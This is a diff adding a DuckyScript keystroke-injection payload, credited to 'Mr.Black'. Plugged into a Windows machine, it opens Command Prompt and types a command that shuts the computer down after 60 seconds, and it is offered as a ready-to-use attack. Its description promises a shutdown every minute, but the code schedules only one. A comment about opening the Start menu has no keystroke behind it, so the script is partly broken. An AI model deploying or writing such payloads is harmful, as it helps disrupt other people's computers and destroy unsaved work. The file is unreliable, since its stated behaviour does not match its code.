@@ -1,0 +1,15 @@
+REM Author: Mr.Black (mrblack0 on Discord)
+REM Description: Shut down your computer every 1 minute, Windows 10+ only
+REM Version: 1.0
+REM Category: Execution
+DELAY 500
+REM Open the Start menu
+DELAY 500
+REM Type "cmd" and press Enter to open the Command Prompt
+STRING cmd
+ENTER
+DELAY 500
+REM Wait to ensure that the Command Prompt is open
+REM Type the scheduled shutdown command (1 minute = 60 seconds)
+STRING shutdown /s /t 60
+ENTER
